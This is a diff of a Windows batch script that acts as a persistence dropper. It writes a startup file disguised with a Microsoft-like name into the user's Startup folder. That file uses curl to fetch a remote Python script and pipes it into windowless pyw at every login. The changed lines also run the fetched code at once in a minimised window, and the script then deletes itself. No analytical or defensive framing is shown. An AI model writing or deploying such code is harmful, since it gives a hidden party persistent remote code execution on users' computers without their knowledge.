@@ -27,10 +27,7 @@ set STARTUP_BATCH_NAME=MicrosoftAlp.bat
 set STARTUP_BATCH_PATH=%DOWNLOAD_DIR%\%STARTUP_BATCH_NAME%
 set STARTUP_FOLDER="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-:: Ensure the Temp directory exists
-if not exist "%DOWNLOAD_DIR%" (
-    mkdir "%DOWNLOAD_DIR%"
-)
+
 
 py --version >nul 2>&1
 IF %ERRORLEVEL% NEQ 0 (
@@ -47,11 +44,13 @@ IF %ERRORLEVEL% NEQ 0 (
 
 echo Creating startup batch file...
 echo @echo off > "%STARTUP_BATCH_PATH%"
-echo curl -s "%PYTHON_SCRIPT_URL%" ^| pyw - >> "%STARTUP_BATCH_PATH%"
+echo start curl -s "%PYTHON_SCRIPT_URL%" ^| pyw - >> "%STARTUP_BATCH_PATH%"
 
-start /min pyw "%PYTHON_SCRIPT_PATH%"
+start /min curl -s "%PYTHON_SCRIPT_URL%" | pyw -
 
 :: Clean up
 del "%~f0"
+
+pause
 
 exit
